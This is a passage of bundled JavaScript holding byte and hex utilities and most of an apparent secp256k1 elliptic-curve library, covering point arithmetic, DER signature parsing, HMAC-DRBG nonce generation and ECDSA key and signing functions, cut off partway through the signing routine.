      exports.isLE = new Uint8Array(new Uint32Array([0x11223344]).buffer)[0] === 0x44;
      if (!exports.isLE) throw new Error('Non little-endian hardware is not supported');
      const hexes = Array.from({
        length: 256
      }, (v, i) => i.toString(16).padStart(2, '0'));
      function bytesToHex(uint8a) {
        if (!(uint8a instanceof Uint8Array)) throw new Error('Uint8Array expected');
        let hex = '';
        for (let i = 0; i < uint8a.length; i++) {
          hex += hexes[uint8a[i]];
        }
        return hex;
      }
      exports.bytesToHex = bytesToHex;
      function hexToBytes(hex) {
        if (typeof hex !== 'string') {
          throw new TypeError('hexToBytes: expected string, got ' + typeof hex);
        }
        if (hex.length % 2) throw new Error('hexToBytes: received invalid unpadded hex');
        const array = new Uint8Array(hex.length / 2);
        for (let i = 0; i < array.length; i++) {
          const j = i * 2;
          const hexByte = hex.slice(j, j + 2);
          const byte = Number.parseInt(hexByte, 16);
          if (Number.isNaN(byte) || byte < 0) throw new Error('Invalid byte sequence');
          array[i] = byte;
        }
        return array;
      }
      exports.hexToBytes = hexToBytes;
      const nextTick = async () => {};
      exports.nextTick = nextTick;
      async function asyncLoop(iters, tick, cb) {
        let ts = Date.now();
        for (let i = 0; i < iters; i++) {
          cb(i);
          const diff = Date.now() - ts;
          if (diff >= 0 && diff < tick) continue;
          await (0, exports.nextTick)();
          ts += diff;
        }
      }
      exports.asyncLoop = asyncLoop;
      function utf8ToBytes(str) {
        if (typeof str !== 'string') {
          throw new TypeError(`utf8ToBytes expected string, got ${typeof str}`);
        }
        return new TextEncoder().encode(str);
      }
      exports.utf8ToBytes = utf8ToBytes;
      function toBytes(data) {
        if (typeof data === 'string') data = utf8ToBytes(data);
        if (!(data instanceof Uint8Array)) throw new TypeError(`Expected input type is Uint8Array (got ${typeof data})`);
        return data;
      }
      exports.toBytes = toBytes;
      function concatBytes(...arrays) {
        if (!arrays.every(a => a instanceof Uint8Array)) throw new Error('Uint8Array list expected');
        if (arrays.length === 1) return arrays[0];
        const length = arrays.reduce((a, arr) => a + arr.length, 0);
        const result = new Uint8Array(length);
        for (let i = 0, pad = 0; i < arrays.length; i++) {
          const arr = arrays[i];
          result.set(arr, pad);
          pad += arr.length;
        }
        return result;
      }
      exports.concatBytes = concatBytes;
      class Hash {
        clone() {
          return this._cloneInto();
        }
      }
      exports.Hash = Hash;
      const isPlainObject = obj => Object.prototype.toString.call(obj) === '[object Object]' && obj.constructor === Object;
      function checkOpts(defaults, opts) {
        if (opts !== undefined && (typeof opts !== 'object' || !isPlainObject(opts))) throw new TypeError('Options should be object or undefined');
        const merged = Object.assign(defaults, opts);
        return merged;
      }
      exports.checkOpts = checkOpts;
      function wrapConstructor(hashConstructor) {
        const hashC = message => hashConstructor().update(toBytes(message)).digest();
        const tmp = hashConstructor();
        hashC.outputLen = tmp.outputLen;
        hashC.blockLen = tmp.blockLen;
        hashC.create = () => hashConstructor();
        return hashC;
      }
      exports.wrapConstructor = wrapConstructor;
      function wrapConstructorWithOpts(hashCons) {
        const hashC = (msg, opts) => hashCons(opts).update(toBytes(msg)).digest();
        const tmp = hashCons({});
        hashC.outputLen = tmp.outputLen;
        hashC.blockLen = tmp.blockLen;
        hashC.create = opts => hashCons(opts);
        return hashC;
      }
      exports.wrapConstructorWithOpts = wrapConstructorWithOpts;
      function randomBytes(bytesLength = 32) {
        if (crypto_1.crypto.web) {
          return crypto_1.crypto.web.getRandomValues(new Uint8Array(bytesLength));
        } else if (crypto_1.crypto.node) {
          return new Uint8Array(crypto_1.crypto.node.randomBytes(bytesLength).buffer);
        } else {
          throw new Error("The environment doesn't have randomBytes function");
        }
      }
      exports.randomBytes = randomBytes;
    }, {
      "@noble/hashes/crypto": 36
    }],
    44: [function (require, module, exports) {
      "use strict";

      Object.defineProperty(exports, "__esModule", {
        value: true
      });
      exports.utils = exports.schnorr = exports.verify = exports.signSync = exports.sign = exports.getSharedSecret = exports.recoverPublicKey = exports.getPublicKey = exports.Signature = exports.Point = exports.CURVE = void 0;
      const nodeCrypto = require("crypto");
      const _0n = BigInt(0);
      const _1n = BigInt(1);
      const _2n = BigInt(2);
      const _3n = BigInt(3);
      const _8n = BigInt(8);
      const CURVE = Object.freeze({
        a: _0n,
        b: BigInt(7),
        P: BigInt('0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f'),
        n: BigInt('0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141'),
        h: _1n,
        Gx: BigInt('55066263022277343669578718895168534326250603453777594175500187360389116729240'),
        Gy: BigInt('32670510020758816978083085130507043184471273380659243275938904335757337482424'),
        beta: BigInt('0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee')
      });
      exports.CURVE = CURVE;
      function weistrass(x) {
        const {
          a,
          b
        } = CURVE;
        const x2 = mod(x * x);
        const x3 = mod(x2 * x);
        return mod(x3 + a * x + b);
      }
      const USE_ENDOMORPHISM = CURVE.a === _0n;
      class ShaError extends Error {
        constructor(message) {
          super(message);
        }
      }
      class JacobianPoint {
        constructor(x, y, z) {
          this.x = x;
          this.y = y;
          this.z = z;
        }
        static fromAffine(p) {
          if (!(p instanceof Point)) {
            throw new TypeError('JacobianPoint#fromAffine: expected Point');
          }
          return new JacobianPoint(p.x, p.y, _1n);
        }
        static toAffineBatch(points) {
          const toInv = invertBatch(points.map(p => p.z));
          return points.map((p, i) => p.toAffine(toInv[i]));
        }
        static normalizeZ(points) {
          return JacobianPoint.toAffineBatch(points).map(JacobianPoint.fromAffine);
        }
        equals(other) {
          if (!(other instanceof JacobianPoint)) throw new TypeError('JacobianPoint expected');
          const {
            x: X1,
            y: Y1,
            z: Z1
          } = this;
          const {
            x: X2,
            y: Y2,
            z: Z2
          } = other;
          const Z1Z1 = mod(Z1 * Z1);
          const Z2Z2 = mod(Z2 * Z2);
          const U1 = mod(X1 * Z2Z2);
          const U2 = mod(X2 * Z1Z1);
          const S1 = mod(mod(Y1 * Z2) * Z2Z2);
          const S2 = mod(mod(Y2 * Z1) * Z1Z1);
          return U1 === U2 && S1 === S2;
        }
        negate() {
          return new JacobianPoint(this.x, mod(-this.y), this.z);
        }
        double() {
          const {
            x: X1,
            y: Y1,
            z: Z1
          } = this;
          const A = mod(X1 * X1);
          const B = mod(Y1 * Y1);
          const C = mod(B * B);
          const x1b = X1 + B;
          const D = mod(_2n * (mod(x1b * x1b) - A - C));
          const E = mod(_3n * A);
          const F = mod(E * E);
          const X3 = mod(F - _2n * D);
          const Y3 = mod(E * (D - X3) - _8n * C);
          const Z3 = mod(_2n * Y1 * Z1);
          return new JacobianPoint(X3, Y3, Z3);
        }
        add(other) {
          if (!(other instanceof JacobianPoint)) throw new TypeError('JacobianPoint expected');
          const {
            x: X1,
            y: Y1,
            z: Z1
          } = this;
          const {
            x: X2,
            y: Y2,
            z: Z2
          } = other;
          if (X2 === _0n || Y2 === _0n) return this;
          if (X1 === _0n || Y1 === _0n) return other;
          const Z1Z1 = mod(Z1 * Z1);
          const Z2Z2 = mod(Z2 * Z2);
          const U1 = mod(X1 * Z2Z2);
          const U2 = mod(X2 * Z1Z1);
          const S1 = mod(mod(Y1 * Z2) * Z2Z2);
          const S2 = mod(mod(Y2 * Z1) * Z1Z1);
          const H = mod(U2 - U1);
          const r = mod(S2 - S1);
          if (H === _0n) {
            if (r === _0n) {
              return this.double();
            } else {
              return JacobianPoint.ZERO;
            }
          }
          const HH = mod(H * H);
          const HHH = mod(H * HH);
          const V = mod(U1 * HH);
          const X3 = mod(r * r - HHH - _2n * V);
          const Y3 = mod(r * (V - X3) - S1 * HHH);
          const Z3 = mod(Z1 * Z2 * H);
          return new JacobianPoint(X3, Y3, Z3);
        }
        subtract(other) {
          return this.add(other.negate());
        }
        multiplyUnsafe(scalar) {
          const P0 = JacobianPoint.ZERO;
          if (typeof scalar === 'bigint' && scalar === _0n) return P0;
          let n = normalizeScalar(scalar);
          if (n === _1n) return this;
          if (!USE_ENDOMORPHISM) {
            let p = P0;
            let d = this;
            while (n > _0n) {
              if (n & _1n) p = p.add(d);
              d = d.double();
              n >>= _1n;
            }
            return p;
          }
          let {
            k1neg,
            k1,
            k2neg,
            k2
          } = splitScalarEndo(n);
          let k1p = P0;
          let k2p = P0;
          let d = this;
          while (k1 > _0n || k2 > _0n) {
            if (k1 & _1n) k1p = k1p.add(d);
            if (k2 & _1n) k2p = k2p.add(d);
            d = d.double();
            k1 >>= _1n;
            k2 >>= _1n;
          }
          if (k1neg) k1p = k1p.negate();
          if (k2neg) k2p = k2p.negate();
          k2p = new JacobianPoint(mod(k2p.x * CURVE.beta), k2p.y, k2p.z);
          return k1p.add(k2p);
        }
        precomputeWindow(W) {
          const windows = USE_ENDOMORPHISM ? 128 / W + 1 : 256 / W + 1;
          const points = [];
          let p = this;
          let base = p;
          for (let window = 0; window < windows; window++) {
            base = p;
            points.push(base);
            for (let i = 1; i < 2 ** (W - 1); i++) {
              base = base.add(p);
              points.push(base);
            }
            p = base.double();
          }
          return points;
        }
        wNAF(n, affinePoint) {
          if (!affinePoint && this.equals(JacobianPoint.BASE)) affinePoint = Point.BASE;
          const W = affinePoint && affinePoint._WINDOW_SIZE || 1;
          if (256 % W) {
            throw new Error('Point#wNAF: Invalid precomputation window, must be power of 2');
          }
          let precomputes = affinePoint && pointPrecomputes.get(affinePoint);
          if (!precomputes) {
            precomputes = this.precomputeWindow(W);
            if (affinePoint && W !== 1) {
              precomputes = JacobianPoint.normalizeZ(precomputes);
              pointPrecomputes.set(affinePoint, precomputes);
            }
          }
          let p = JacobianPoint.ZERO;
          let f = JacobianPoint.ZERO;
          const windows = 1 + (USE_ENDOMORPHISM ? 128 / W : 256 / W);
          const windowSize = 2 ** (W - 1);
          const mask = BigInt(2 ** W - 1);
          const maxNumber = 2 ** W;
          const shiftBy = BigInt(W);
          for (let window = 0; window < windows; window++) {
            const offset = window * windowSize;
            let wbits = Number(n & mask);
            n >>= shiftBy;
            if (wbits > windowSize) {
              wbits -= maxNumber;
              n += _1n;
            }
            if (wbits === 0) {
              let pr = precomputes[offset];
              if (window % 2) pr = pr.negate();
              f = f.add(pr);
            } else {
              let cached = precomputes[offset + Math.abs(wbits) - 1];
              if (wbits < 0) cached = cached.negate();
              p = p.add(cached);
            }
          }
          return {
            p,
            f
          };
        }
        multiply(scalar, affinePoint) {
          let n = normalizeScalar(scalar);
          let point;
          let fake;
          if (USE_ENDOMORPHISM) {
            const {
              k1neg,
              k1,
              k2neg,
              k2
            } = splitScalarEndo(n);
            let {
              p: k1p,
              f: f1p
            } = this.wNAF(k1, affinePoint);
            let {
              p: k2p,
              f: f2p
            } = this.wNAF(k2, affinePoint);
            if (k1neg) k1p = k1p.negate();
            if (k2neg) k2p = k2p.negate();
            k2p = new JacobianPoint(mod(k2p.x * CURVE.beta), k2p.y, k2p.z);
            point = k1p.add(k2p);
            fake = f1p.add(f2p);
          } else {
            const {
              p,
              f
            } = this.wNAF(n, affinePoint);
            point = p;
            fake = f;
          }
          return JacobianPoint.normalizeZ([point, fake])[0];
        }
        toAffine(invZ = invert(this.z)) {
          const {
            x,
            y,
            z
          } = this;
          const iz1 = invZ;
          const iz2 = mod(iz1 * iz1);
          const iz3 = mod(iz2 * iz1);
          const ax = mod(x * iz2);
          const ay = mod(y * iz3);
          const zz = mod(z * iz1);
          if (zz !== _1n) throw new Error('invZ was invalid');
          return new Point(ax, ay);
        }
      }
      JacobianPoint.BASE = new JacobianPoint(CURVE.Gx, CURVE.Gy, _1n);
      JacobianPoint.ZERO = new JacobianPoint(_0n, _1n, _0n);
      const pointPrecomputes = new WeakMap();
      class Point {
        constructor(x, y) {
          this.x = x;
          this.y = y;
        }
        _setWindowSize(windowSize) {
          this._WINDOW_SIZE = windowSize;
          pointPrecomputes.delete(this);
        }
        hasEvenY() {
          return this.y % _2n === _0n;
        }
        static fromCompressedHex(bytes) {
          const isShort = bytes.length === 32;
          const x = bytesToNumber(isShort ? bytes : bytes.subarray(1));
          if (!isValidFieldElement(x)) throw new Error('Point is not on curve');
          const y2 = weistrass(x);
          let y = sqrtMod(y2);
          const isYOdd = (y & _1n) === _1n;
          if (isShort) {
            if (isYOdd) y = mod(-y);
          } else {
            const isFirstByteOdd = (bytes[0] & 1) === 1;
            if (isFirstByteOdd !== isYOdd) y = mod(-y);
          }
          const point = new Point(x, y);
          point.assertValidity();
          return point;
        }
        static fromUncompressedHex(bytes) {
          const x = bytesToNumber(bytes.subarray(1, 33));
          const y = bytesToNumber(bytes.subarray(33, 65));
          const point = new Point(x, y);
          point.assertValidity();
          return point;
        }
        static fromHex(hex) {
          const bytes = ensureBytes(hex);
          const len = bytes.length;
          const header = bytes[0];
          if (len === 32 || len === 33 && (header === 0x02 || header === 0x03)) {
            return this.fromCompressedHex(bytes);
          }
          if (len === 65 && header === 0x04) return this.fromUncompressedHex(bytes);
          throw new Error(`Point.fromHex: received invalid point. Expected 32-33 compressed bytes or 65 uncompressed bytes, not ${len}`);
        }
        static fromPrivateKey(privateKey) {
          return Point.BASE.multiply(normalizePrivateKey(privateKey));
        }
        static fromSignature(msgHash, signature, recovery) {
          msgHash = ensureBytes(msgHash);
          const h = truncateHash(msgHash);
          const {
            r,
            s
          } = normalizeSignature(signature);
          if (recovery !== 0 && recovery !== 1) {
            throw new Error('Cannot recover signature: invalid recovery bit');
          }
          const prefix = recovery & 1 ? '03' : '02';
          const R = Point.fromHex(prefix + numTo32bStr(r));
          const {
            n
          } = CURVE;
          const rinv = invert(r, n);
          const u1 = mod(-h * rinv, n);
          const u2 = mod(s * rinv, n);
          const Q = Point.BASE.multiplyAndAddUnsafe(R, u1, u2);
          if (!Q) throw new Error('Cannot recover signature: point at infinify');
          Q.assertValidity();
          return Q;
        }
        toRawBytes(isCompressed = false) {
          return hexToBytes(this.toHex(isCompressed));
        }
        toHex(isCompressed = false) {
          const x = numTo32bStr(this.x);
          if (isCompressed) {
            const prefix = this.hasEvenY() ? '02' : '03';
            return `${prefix}${x}`;
          } else {
            return `04${x}${numTo32bStr(this.y)}`;
          }
        }
        toHexX() {
          return this.toHex(true).slice(2);
        }
        toRawX() {
          return this.toRawBytes(true).slice(1);
        }
        assertValidity() {
          const msg = 'Point is not on elliptic curve';
          const {
            x,
            y
          } = this;
          if (!isValidFieldElement(x) || !isValidFieldElement(y)) throw new Error(msg);
          const left = mod(y * y);
          const right = weistrass(x);
          if (mod(left - right) !== _0n) throw new Error(msg);
        }
        equals(other) {
          return this.x === other.x && this.y === other.y;
        }
        negate() {
          return new Point(this.x, mod(-this.y));
        }
        double() {
          return JacobianPoint.fromAffine(this).double().toAffine();
        }
        add(other) {
          return JacobianPoint.fromAffine(this).add(JacobianPoint.fromAffine(other)).toAffine();
        }
        subtract(other) {
          return this.add(other.negate());
        }
        multiply(scalar) {
          return JacobianPoint.fromAffine(this).multiply(scalar, this).toAffine();
        }
        multiplyAndAddUnsafe(Q, a, b) {
          const P = JacobianPoint.fromAffine(this);
          const aP = a === _0n || a === _1n || this !== Point.BASE ? P.multiplyUnsafe(a) : P.multiply(a);
          const bQ = JacobianPoint.fromAffine(Q).multiplyUnsafe(b);
          const sum = aP.add(bQ);
          return sum.equals(JacobianPoint.ZERO) ? undefined : sum.toAffine();
        }
      }
      exports.Point = Point;
      Point.BASE = new Point(CURVE.Gx, CURVE.Gy);
      Point.ZERO = new Point(_0n, _0n);
      function sliceDER(s) {
        return Number.parseInt(s[0], 16) >= 8 ? '00' + s : s;
      }
      function parseDERInt(data) {
        if (data.length < 2 || data[0] !== 0x02) {
          throw new Error(`Invalid signature integer tag: ${bytesToHex(data)}`);
        }
        const len = data[1];
        const res = data.subarray(2, len + 2);
        if (!len || res.length !== len) {
          throw new Error(`Invalid signature integer: wrong length`);
        }
        if (res[0] === 0x00 && res[1] <= 0x7f) {
          throw new Error('Invalid signature integer: trailing length');
        }
        return {
          data: bytesToNumber(res),
          left: data.subarray(len + 2)
        };
      }
      function parseDERSignature(data) {
        if (data.length < 2 || data[0] != 0x30) {
          throw new Error(`Invalid signature tag: ${bytesToHex(data)}`);
        }
        if (data[1] !== data.length - 2) {
          throw new Error('Invalid signature: incorrect length');
        }
        const {
          data: r,
          left: sBytes
        } = parseDERInt(data.subarray(2));
        const {
          data: s,
          left: rBytesLeft
        } = parseDERInt(sBytes);
        if (rBytesLeft.length) {
          throw new Error(`Invalid signature: left bytes after parsing: ${bytesToHex(rBytesLeft)}`);
        }
        return {
          r,
          s
        };
      }
      class Signature {
        constructor(r, s) {
          this.r = r;
          this.s = s;
          this.assertValidity();
        }
        static fromCompact(hex) {
          const arr = hex instanceof Uint8Array;
          const name = 'Signature.fromCompact';
          if (typeof hex !== 'string' && !arr) throw new TypeError(`${name}: Expected string or Uint8Array`);
          const str = arr ? bytesToHex(hex) : hex;
          if (str.length !== 128) throw new Error(`${name}: Expected 64-byte hex`);
          return new Signature(hexToNumber(str.slice(0, 64)), hexToNumber(str.slice(64, 128)));
        }
        static fromDER(hex) {
          const arr = hex instanceof Uint8Array;
          if (typeof hex !== 'string' && !arr) throw new TypeError(`Signature.fromDER: Expected string or Uint8Array`);
          const {
            r,
            s
          } = parseDERSignature(arr ? hex : hexToBytes(hex));
          return new Signature(r, s);
        }
        static fromHex(hex) {
          return this.fromDER(hex);
        }
        assertValidity() {
          const {
            r,
            s
          } = this;
          if (!isWithinCurveOrder(r)) throw new Error('Invalid Signature: r must be 0 < r < n');
          if (!isWithinCurveOrder(s)) throw new Error('Invalid Signature: s must be 0 < s < n');
        }
        hasHighS() {
          const HALF = CURVE.n >> _1n;
          return this.s > HALF;
        }
        normalizeS() {
          return this.hasHighS() ? new Signature(this.r, CURVE.n - this.s) : this;
        }
        toDERRawBytes(isCompressed = false) {
          return hexToBytes(this.toDERHex(isCompressed));
        }
        toDERHex(isCompressed = false) {
          const sHex = sliceDER(numberToHexUnpadded(this.s));
          if (isCompressed) return sHex;
          const rHex = sliceDER(numberToHexUnpadded(this.r));
          const rLen = numberToHexUnpadded(rHex.length / 2);
          const sLen = numberToHexUnpadded(sHex.length / 2);
          const length = numberToHexUnpadded(rHex.length / 2 + sHex.length / 2 + 4);
          return `30${length}02${rLen}${rHex}02${sLen}${sHex}`;
        }
        toRawBytes() {
          return this.toDERRawBytes();
        }
        toHex() {
          return this.toDERHex();
        }
        toCompactRawBytes() {
          return hexToBytes(this.toCompactHex());
        }
        toCompactHex() {
          return numTo32bStr(this.r) + numTo32bStr(this.s);
        }
      }
      exports.Signature = Signature;
      function concatBytes(...arrays) {
        if (!arrays.every(b => b instanceof Uint8Array)) throw new Error('Uint8Array list expected');
        if (arrays.length === 1) return arrays[0];
        const length = arrays.reduce((a, arr) => a + arr.length, 0);
        const result = new Uint8Array(length);
        for (let i = 0, pad = 0; i < arrays.length; i++) {
          const arr = arrays[i];
          result.set(arr, pad);
          pad += arr.length;
        }
        return result;
      }
      const hexes = Array.from({
        length: 256
      }, (v, i) => i.toString(16).padStart(2, '0'));
      function bytesToHex(uint8a) {
        if (!(uint8a instanceof Uint8Array)) throw new Error('Expected Uint8Array');
        let hex = '';
        for (let i = 0; i < uint8a.length; i++) {
          hex += hexes[uint8a[i]];
        }
        return hex;
      }
      const POW_2_256 = BigInt('0x10000000000000000000000000000000000000000000000000000000000000000');
      function numTo32bStr(num) {
        if (typeof num !== 'bigint') throw new Error('Expected bigint');
        if (!(_0n <= num && num < POW_2_256)) throw new Error('Expected number < 2^256');
        return num.toString(16).padStart(64, '0');
      }
      function numTo32b(num) {
        const b = hexToBytes(numTo32bStr(num));
        if (b.length !== 32) throw new Error('Error: expected 32 bytes');
        return b;
      }
      function numberToHexUnpadded(num) {
        const hex = num.toString(16);
        return hex.length & 1 ? `0${hex}` : hex;
      }
      function hexToNumber(hex) {
        if (typeof hex !== 'string') {
          throw new TypeError('hexToNumber: expected string, got ' + typeof hex);
        }
        return BigInt(`0x${hex}`);
      }
      function hexToBytes(hex) {
        if (typeof hex !== 'string') {
          throw new TypeError('hexToBytes: expected string, got ' + typeof hex);
        }
        if (hex.length % 2) throw new Error('hexToBytes: received invalid unpadded hex' + hex.length);
        const array = new Uint8Array(hex.length / 2);
        for (let i = 0; i < array.length; i++) {
          const j = i * 2;
          const hexByte = hex.slice(j, j + 2);
          const byte = Number.parseInt(hexByte, 16);
          if (Number.isNaN(byte) || byte < 0) throw new Error('Invalid byte sequence');
          array[i] = byte;
        }
        return array;
      }
      function bytesToNumber(bytes) {
        return hexToNumber(bytesToHex(bytes));
      }
      function ensureBytes(hex) {
        return hex instanceof Uint8Array ? Uint8Array.from(hex) : hexToBytes(hex);
      }
      function normalizeScalar(num) {
        if (typeof num === 'number' && Number.isSafeInteger(num) && num > 0) return BigInt(num);
        if (typeof num === 'bigint' && isWithinCurveOrder(num)) return num;
        throw new TypeError('Expected valid private scalar: 0 < scalar < curve.n');
      }
      function mod(a, b = CURVE.P) {
        const result = a % b;
        return result >= _0n ? result : b + result;
      }
      function pow2(x, power) {
        const {
          P
        } = CURVE;
        let res = x;
        while (power-- > _0n) {
          res *= res;
          res %= P;
        }
        return res;
      }
      function sqrtMod(x) {
        const {
          P
        } = CURVE;
        const _6n = BigInt(6);
        const _11n = BigInt(11);
        const _22n = BigInt(22);
        const _23n = BigInt(23);
        const _44n = BigInt(44);
        const _88n = BigInt(88);
        const b2 = x * x * x % P;
        const b3 = b2 * b2 * x % P;
        const b6 = pow2(b3, _3n) * b3 % P;
        const b9 = pow2(b6, _3n) * b3 % P;
        const b11 = pow2(b9, _2n) * b2 % P;
        const b22 = pow2(b11, _11n) * b11 % P;
        const b44 = pow2(b22, _22n) * b22 % P;
        const b88 = pow2(b44, _44n) * b44 % P;
        const b176 = pow2(b88, _88n) * b88 % P;
        const b220 = pow2(b176, _44n) * b44 % P;
        const b223 = pow2(b220, _3n) * b3 % P;
        const t1 = pow2(b223, _23n) * b22 % P;
        const t2 = pow2(t1, _6n) * b2 % P;
        return pow2(t2, _2n);
      }
      function invert(number, modulo = CURVE.P) {
        if (number === _0n || modulo <= _0n) {
          throw new Error(`invert: expected positive integers, got n=${number} mod=${modulo}`);
        }
        let a = mod(number, modulo);
        let b = modulo;
        let x = _0n,
          y = _1n,
          u = _1n,
          v = _0n;
        while (a !== _0n) {
          const q = b / a;
          const r = b % a;
          const m = x - u * q;
          const n = y - v * q;
          b = a, a = r, x = u, y = v, u = m, v = n;
        }
        const gcd = b;
        if (gcd !== _1n) throw new Error('invert: does not exist');
        return mod(x, modulo);
      }
      function invertBatch(nums, p = CURVE.P) {
        const scratch = new Array(nums.length);
        const lastMultiplied = nums.reduce((acc, num, i) => {
          if (num === _0n) return acc;
          scratch[i] = acc;
          return mod(acc * num, p);
        }, _1n);
        const inverted = invert(lastMultiplied, p);
        nums.reduceRight((acc, num, i) => {
          if (num === _0n) return acc;
          scratch[i] = mod(acc * scratch[i], p);
          return mod(acc * num, p);
        }, inverted);
        return scratch;
      }
      const divNearest = (a, b) => (a + b / _2n) / b;
      const ENDO = {
        a1: BigInt('0x3086d221a7d46bcde86c90e49284eb15'),
        b1: -_1n * BigInt('0xe4437ed6010e88286f547fa90abfe4c3'),
        a2: BigInt('0x114ca50f7a8e2f3f657c1108d9d44cfd8'),
        b2: BigInt('0x3086d221a7d46bcde86c90e49284eb15'),
        POW_2_128: BigInt('0x100000000000000000000000000000000')
      };
      function splitScalarEndo(k) {
        const {
          n
        } = CURVE;
        const {
          a1,
          b1,
          a2,
          b2,
          POW_2_128
        } = ENDO;
        const c1 = divNearest(b2 * k, n);
        const c2 = divNearest(-b1 * k, n);
        let k1 = mod(k - c1 * a1 - c2 * a2, n);
        let k2 = mod(-c1 * b1 - c2 * b2, n);
        const k1neg = k1 > POW_2_128;
        const k2neg = k2 > POW_2_128;
        if (k1neg) k1 = n - k1;
        if (k2neg) k2 = n - k2;
        if (k1 > POW_2_128 || k2 > POW_2_128) {
          throw new Error('splitScalarEndo: Endomorphism failed, k=' + k);
        }
        return {
          k1neg,
          k1,
          k2neg,
          k2
        };
      }
      function truncateHash(hash) {
        const {
          n
        } = CURVE;
        const byteLength = hash.length;
        const delta = byteLength * 8 - 256;
        let h = bytesToNumber(hash);
        if (delta > 0) h = h >> BigInt(delta);
        if (h >= n) h -= n;
        return h;
      }
      let _sha256Sync;
      let _hmacSha256Sync;
      class HmacDrbg {
        constructor() {
          this.v = new Uint8Array(32).fill(1);
          this.k = new Uint8Array(32).fill(0);
          this.counter = 0;
        }
        hmac(...values) {
          return exports.utils.hmacSha256(this.k, ...values);
        }
        hmacSync(...values) {
          return _hmacSha256Sync(this.k, ...values);
        }
        checkSync() {
          if (typeof _hmacSha256Sync !== 'function') throw new ShaError('hmacSha256Sync needs to be set');
        }
        incr() {
          if (this.counter >= 1000) throw new Error('Tried 1,000 k values for sign(), all were invalid');
          this.counter += 1;
        }
        async reseed(seed = new Uint8Array()) {
          this.k = await this.hmac(this.v, Uint8Array.from([0x00]), seed);
          this.v = await this.hmac(this.v);
          if (seed.length === 0) return;
          this.k = await this.hmac(this.v, Uint8Array.from([0x01]), seed);
          this.v = await this.hmac(this.v);
        }
        reseedSync(seed = new Uint8Array()) {
          this.checkSync();
          this.k = this.hmacSync(this.v, Uint8Array.from([0x00]), seed);
          this.v = this.hmacSync(this.v);
          if (seed.length === 0) return;
          this.k = this.hmacSync(this.v, Uint8Array.from([0x01]), seed);
          this.v = this.hmacSync(this.v);
        }
        async generate() {
          this.incr();
          this.v = await this.hmac(this.v);
          return this.v;
        }
        generateSync() {
          this.checkSync();
          this.incr();
          this.v = this.hmacSync(this.v);
          return this.v;
        }
      }
      function isWithinCurveOrder(num) {
        return _0n < num && num < CURVE.n;
      }
      function isValidFieldElement(num) {
        return _0n < num && num < CURVE.P;
      }
      function kmdToSig(kBytes, m, d) {
        const k = bytesToNumber(kBytes);
        if (!isWithinCurveOrder(k)) return;
        const {
          n
        } = CURVE;
        const q = Point.BASE.multiply(k);
        const r = mod(q.x, n);
        if (r === _0n) return;
        const s = mod(invert(k, n) * mod(m + d * r, n), n);
        if (s === _0n) return;
        const sig = new Signature(r, s);
        const recovery = (q.x === sig.r ? 0 : 2) | Number(q.y & _1n);
        return {
          sig,
          recovery
        };
      }
      function normalizePrivateKey(key) {
        let num;
        if (typeof key === 'bigint') {
          num = key;
        } else if (typeof key === 'number' && Number.isSafeInteger(key) && key > 0) {
          num = BigInt(key);
        } else if (typeof key === 'string') {
          if (key.length !== 64) throw new Error('Expected 32 bytes of private key');
          num = hexToNumber(key);
        } else if (key instanceof Uint8Array) {
          if (key.length !== 32) throw new Error('Expected 32 bytes of private key');
          num = bytesToNumber(key);
        } else {
          throw new TypeError('Expected valid private key');
        }
        if (!isWithinCurveOrder(num)) throw new Error('Expected private key: 0 < key < n');
        return num;
      }
      function normalizePublicKey(publicKey) {
        if (publicKey instanceof Point) {
          publicKey.assertValidity();
          return publicKey;
        } else {
          return Point.fromHex(publicKey);
        }
      }
      function normalizeSignature(signature) {
        if (signature instanceof Signature) {
          signature.assertValidity();
          return signature;
        }
        try {
          return Signature.fromDER(signature);
        } catch (error) {
          return Signature.fromCompact(signature);
        }
      }
      function getPublicKey(privateKey, isCompressed = false) {
        return Point.fromPrivateKey(privateKey).toRawBytes(isCompressed);
      }
      exports.getPublicKey = getPublicKey;
      function recoverPublicKey(msgHash, signature, recovery, isCompressed = false) {
        return Point.fromSignature(msgHash, signature, recovery).toRawBytes(isCompressed);
      }
      exports.recoverPublicKey = recoverPublicKey;
      function isProbPub(item) {
        const arr = item instanceof Uint8Array;
        const str = typeof item === 'string';
        const len = (arr || str) && item.length;
        if (arr) return len === 33 || len === 65;
        if (str) return len === 66 || len === 130;
        if (item instanceof Point) return true;
        return false;
      }
      function getSharedSecret(privateA, publicB, isCompressed = false) {
        if (isProbPub(privateA)) throw new TypeError('getSharedSecret: first arg must be private key');
        if (!isProbPub(publicB)) throw new TypeError('getSharedSecret: second arg must be public key');
        const b = normalizePublicKey(publicB);
        b.assertValidity();
        return b.multiply(normalizePrivateKey(privateA)).toRawBytes(isCompressed);
      }
      exports.getSharedSecret = getSharedSecret;
      function bits2int(bytes) {
        const slice = bytes.length > 32 ? bytes.slice(0, 32) : bytes;
        return bytesToNumber(slice);
      }
      function bits2octets(bytes) {
        const z1 = bits2int(bytes);
        const z2 = mod(z1, CURVE.n);
        return int2octets(z2 < _0n ? z1 : z2);
      }
      function int2octets(num) {
        return numTo32b(num);
      }
      function initSigArgs(msgHash, privateKey, extraEntropy) {
        if (msgHash == null) throw new Error(`sign: expected valid message hash, not "${msgHash}"`);
        const h1 = ensureBytes(msgHash);
        const d = normalizePrivateKey(privateKey);
        const seedArgs = [int2octets(d), bits2octets(h1)];
        if (extraEntropy != null) {
          if (extraEntropy === true) extraEntropy = exports.utils.randomBytes(32);
          const e = ensureBytes(extraEntropy);
          if (e.length !== 32) throw new Error('sign: Expected 32 bytes of extra data');
          seedArgs.push(e);
        }
        const seed = concatBytes(...seedArgs);
        const m = bits2int(h1);
        return {
          seed,
          m,
          d
        };
      }
      function finalizeSig(recSig, opts) {
        let {
          sig,
          recovery
        } = recSig;
        const {
          canonical,
          der,
          recovered
        } = Object.assign({
          canonical: true,
          der: true
        }, opts);
        if (canonical && sig.hasHighS()) {
          sig = sig.normalizeS();
          recovery ^= 1;
        }
        const hashed = der ? sig.toDERRawBytes() : sig.toCompactRawBytes();
        return recovered ? [hashed, recovery] : hashed;
      }
      async function sign(msgHash, privKey, opts = {}) {
        const {
          seed,
          m,
          d
        } = initSigArgs(msgHash, privKey, opts.extraEntropy);
        let sig;
        const drbg = new HmacDrbg();
        await drbg.reseed(seed);
        while (!(sig = kmdToSig(await drbg.generate(), m, d))) await drbg.reseed();
        return finalizeSig(sig, opts);
